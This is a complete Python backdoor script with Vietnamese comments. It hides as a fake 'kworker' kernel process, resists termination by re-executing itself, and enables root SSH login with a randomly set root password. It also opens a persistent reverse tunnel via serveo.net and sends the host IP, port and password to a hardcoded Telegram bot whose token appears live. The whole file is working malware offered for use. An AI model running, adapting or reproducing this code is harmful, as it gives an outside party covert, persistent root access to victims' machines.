import os
import sys
import signal
import time
import random
import string
import subprocess
import requests
import socket
import ctypes

# --- Cấu hình Telegram ---
TELEGRAM_BOT_TOKEN = '7287063473:AAG8TGvBYmEd2HRzrsOQG2n2wtv0kRou5NI'
TELEGRAM_CHAT_ID = '7907011828'
LOCK_FILE = '/tmp/.ssh_reverse_lock'
FAKE_PROCESS_NAME = b'kworker/0:1H'

def send_telegram_message(text):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": text,
        "parse_mode": "HTML"
    }
    try:
        requests.post(url, json=data, timeout=10)
    except:
        pass

def is_installed(package):
    return subprocess.call(['which', package], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0

def install_openssh_server():
    os.system('apt update -y >/dev/null 2>&1')
    os.system('apt install openssh-server -y >/dev/null 2>&1')
    os.makedirs('/run/sshd', exist_ok=True)
    os.system('chmod 0755 /run/sshd')
    os.system('ssh-keygen -A >/dev/null 2>&1')
    with open('/etc/ssh/sshd_config', 'a') as f:
        f.write('\nPermitRootLogin yes\n')
        f.write('PasswordAuthentication yes\n')
        f.write('PubkeyAuthentication no\n')

def generate_password(length=12):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "Không xác định IP"

def setup_reverse_ssh(serveo_port, local_port):
    while True:
        try:
            cmd = f"ssh -o StrictHostKeyChecking=no -R {serveo_port}:localhost:{local_port} serveo.net -N -o ServerAliveInterval=60 -o ServerAliveCountMax=3"
            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            process.wait()
        except:
            time.sleep(5)

def change_ssh_port_only(port, password):
    sshd_config = '/etc/ssh/sshd_config'
    with open(sshd_config, 'r') as file:
        lines = file.readlines()

    new_lines = []
    for line in lines:
        if line.strip().startswith('Port') or line.strip().startswith('PasswordAuthentication'):
            continue
        new_lines.append(line)

    new_lines.append(f"Port {port}\n")
    new_lines.append("PasswordAuthentication yes\n")
    new_lines.append("PermitRootLogin yes\n")
    new_lines.append("UseDNS no\n")

    with open(sshd_config, 'w') as file:
        file.writelines(new_lines)

    os.system(f'echo root:{password} | chpasswd')
    subprocess.Popen(['/usr/sbin/sshd', '-p', str(port)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def rename_process(new_name):
    libc = ctypes.cdll.LoadLibrary('libc.so.6')
    buff = ctypes.create_string_buffer(len(new_name))
    buff.value = new_name
    libc.prctl(15, ctypes.byref(buff), 0, 0, 0)

def check_single_instance():
    if os.path.exists(LOCK_FILE):
        try:
            with open(LOCK_FILE, 'r') as f:
                pid = int(f.read().strip())
            os.kill(pid, 0)  # Kiểm tra nếu process tồn tại
            print("\n[ERROR] Đã có tiến trình đang chạy! Không thể khởi động thêm!\n")
            sys.exit(1)
        except (ProcessLookupError, ValueError, OSError):
            try:
                os.remove(LOCK_FILE)
            except:
                pass

def daemonize():
    if os.fork() > 0:
        sys.exit(0)
    os.setsid()
    if os.fork() > 0:
        sys.exit(0)
    sys.stdin = open(os.devnull, 'r')
    sys.stdout = open(os.devnull, 'a+')
    sys.stderr = open(os.devnull, 'a+')
    os.chdir('/')
    os.umask(0)

def create_lock():
    with open(LOCK_FILE, 'w') as f:
        f.write(str(os.getpid()))

def remove_lock():
    try:
        if os.path.exists(LOCK_FILE):
            os.remove(LOCK_FILE)
    except:
        pass

def handle_exit(signum, frame):
    remove_lock()
    os.execv(sys.executable, [sys.executable] + sys.argv)  # Restart lại ngay lập tức

def main():
    check_single_instance()
    daemonize()
    create_lock()
    rename_process(FAKE_PROCESS_NAME)

    # Bắt tín hiệu kill/crash
    for sig in (signal.SIGTERM, signal.SIGINT, signal.SIGHUP, signal.SIGQUIT):
        signal.signal(sig, handle_exit)

    if not is_installed('sshd'):
        install_openssh_server()

    ssh_port = random.randint(2000, 65000)
    ssh_password = generate_password()
    serveo_port = random.randint(10000, 60000)

    change_ssh_port_only(ssh_port, ssh_password)

    ip = get_local_ip()
    connect_info = f"""<b>[SSH INFO]</b>

<b>IP Local:</b> <code>{ip}</code>
<b>Port SSH:</b> <code>{ssh_port}</code>
<b>Password:</b> <code>{ssh_password}</code>

<b>Reverse SSH:</b> <code>ssh root@serveo.net -p {serveo_port}</code>
"""
    send_telegram_message(connect_info)

    try:
        setup_reverse_ssh(serveo_port, ssh_port)
    except Exception:
        handle_exit(None, None)

if __name__ == '__main__':
    main()